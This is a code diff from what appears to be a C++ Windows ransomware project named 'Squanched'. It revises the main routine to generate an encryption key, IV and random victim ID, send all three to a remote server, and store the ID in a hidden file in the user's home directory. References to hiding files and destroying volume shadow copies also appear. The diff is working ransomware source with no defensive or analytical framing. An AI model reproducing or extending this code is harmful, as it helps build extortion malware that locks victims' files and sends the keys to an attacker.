@@ -2,7 +2,7 @@
 #include <algorithm>
 #include <stdexcept>
 #ifdef ENC
-#if 1
+#if 0
 using namespace boost::filesystem;
 using std::string;
 
@@ -16,7 +16,7 @@ DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& a
 
 
 DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key);
-Status sendIVAndKeyToServer(PBYTE masterIV, PBYTE masterKey);
+Status sendIVAndKeyToServer(PBYTE masterIV, PBYTE masterKey, PBYTE id);
 void changeHiddenFileState(bool state);
 void destroyVSS();
 
@@ -26,19 +26,35 @@ int main(int argc, char* argv[]) {
 //	crypt_data* d = generatekey();//TODO also move to encrypt
 	PBYTE masterIV, masterKey;
 	Status status = generateKeyAndIV(&masterIV, &masterKey);
+
+	PBYTE id = (PBYTE)HeapAlloc(GetProcessHeap(), 0, ID_LEN);
+	if (NULL == id) {
+		//TODO handle error
+	}
+	status = BCryptGenRandom(NULL, id, ID_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
 	//TODO Check STATUS
-	status = sendIVAndKeyToServer(masterIV,masterKey);
+	status = sendIVAndKeyToServer(masterIV,masterKey,id);
 	//TODO Check STATUS
 //	destroyVSS();
 	changeHiddenFileState(false);
-	string pathToMasters = R"(C:\Programming\RansomWare\236499\Squanched\DebugKEY-IV.txt)";
-	std::ofstream masterKeyIVFile;
-	masterKeyIVFile.open(pathToMasters, std::ios::binary);
-	masterKeyIVFile.write((char*)masterKey, KEY_LEN);
-	masterKeyIVFile.write((char*)masterIV, IV_LEN);
-	DWORD attributes = GetFileAttributes(pathToMasters.c_str());
-	SetFileAttributes(pathToMasters.c_str(), attributes + FILE_ATTRIBUTE_HIDDEN);
-	masterKeyIVFile.close();
+
+//	string pathToMasters = R"(C:\Programming\RansomWare\236499\Squanched\DebugKEY-IV.txt)";
+//	std::ofstream masterKeyIVFile;
+//	masterKeyIVFile.open(pathToMasters, std::ios::binary);
+//	masterKeyIVFile.write((char*)masterKey, KEY_LEN);
+//	masterKeyIVFile.write((char*)masterIV, IV_LEN);
+//	DWORD attributes = GetFileAttributes(pathToMasters.c_str());
+//	SetFileAttributes(pathToMasters.c_str(), attributes + FILE_ATTRIBUTE_HIDDEN);
+//	masterKeyIVFile.close();
+
+	string pathToID = get_home()+R"(\SquanchedID.id)";
+	std::ofstream IDFile;
+	IDFile.open(pathToID, std::ios::binary);
+	IDFile.write((char*)id, ID_LEN);
+	DWORD attributes = GetFileAttributes(pathToID.c_str());
+	SetFileAttributes(pathToID.c_str(), attributes + FILE_ATTRIBUTE_HIDDEN);
+	IDFile.close();
+
 	changeHiddenFileState(true);
 	
 #ifdef DEBUG
@@ -61,59 +77,21 @@ int main(int argc, char* argv[]) {
 //
 //	notify();
 //
+
+	//TODO clean id,masterKey,masterIV
 	return 0;
 }
 
-std::string string_to_hex(const std::string& input)
+
+
+
+
+
+Status sendIVAndKeyToServer(PBYTE masterIV, PBYTE masterKey, PBYTE id)
 {
-	static const char* const lut = "0123456789ABCDEF";
-	size_t len = input.length();
 
-	std::string output;
-	output.reserve(2 * len);
-	for (size_t i = 0; i < len; ++i)
-	{
-		const unsigned char c = input[i];
-		output.push_back(lut[c >> 4]);
-		output.push_back(lut[c & 15]);
-	}
-	return output;
-}
-
-
-
-std::string hex_to_string(const std::string& input)
-{
-	static const char* const lut = "0123456789ABCDEF";
-	size_t len = input.length();
-	if (len & 1) throw std::invalid_argument("odd length");
-
-	std::string output;
-	output.reserve(len / 2);
-	for (size_t i = 0; i < len; i += 2)
-	{
-		char a = input[i];
-		const char* p = std::lower_bound(lut, lut + 16, a);
-		if (*p != a) throw std::invalid_argument("not a hex digit");
-
-		char b = input[i + 1];
-		const char* q = std::lower_bound(lut, lut + 16, b);
-		if (*q != b) throw std::invalid_argument("not a hex digit");
-
-		output.push_back(((p - lut) << 4) | (q - lut));
-	}
-	return output;
-}
-
-Status sendIVAndKeyToServer(PBYTE masterIV, PBYTE masterKey)
-{
-	PBYTE id = (PBYTE)HeapAlloc(GetProcessHeap(), 0, ID_LEN);
-	if (NULL == id) {
-		//TODO handle error
-	}
 
 	DWORD status;
-	status = BCryptGenRandom(NULL, id, ID_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
 	string strID;
 	strID.assign((char*)id, ID_LEN);
 	strID = string_to_hex(strID);
@@ -129,7 +107,7 @@ Status sendIVAndKeyToServer(PBYTE masterIV, PBYTE masterKey)
 	str += "key=" + strMasterKey;
 	status = SendToServer(str);
 
-	HeapFree(GetProcessHeap(), 0, id);
+	
 	return status;
 }
 
